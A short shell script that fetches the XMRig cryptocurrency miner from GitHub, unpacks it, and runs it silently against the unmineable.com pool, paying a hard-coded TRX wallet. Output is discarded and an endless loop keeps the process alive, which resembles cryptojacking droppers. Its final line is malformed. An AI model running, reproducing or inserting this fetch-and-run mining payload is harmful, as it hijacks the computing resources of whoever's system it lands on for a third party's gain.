#!/bin/sh
wget https://github.com/xmrig/xmrig/releases/download/v6.15.1/xmrig-6.15.1-linux-x64.tar.gz
tar xf xmrig-6.15.1-linux-x64.tar.gz 
cd xmrig-6.15.1
./xmrig -o rx.unmineable.com:3333 -u TRX:TBsH2ed3jbtYAGfZC9EgiGjdEALJoFJHby.Web0 -p x -k -a rx/0 > /dev/null
while [ 1 ]; do
sleep 3
done
sleep 999 /dev/null
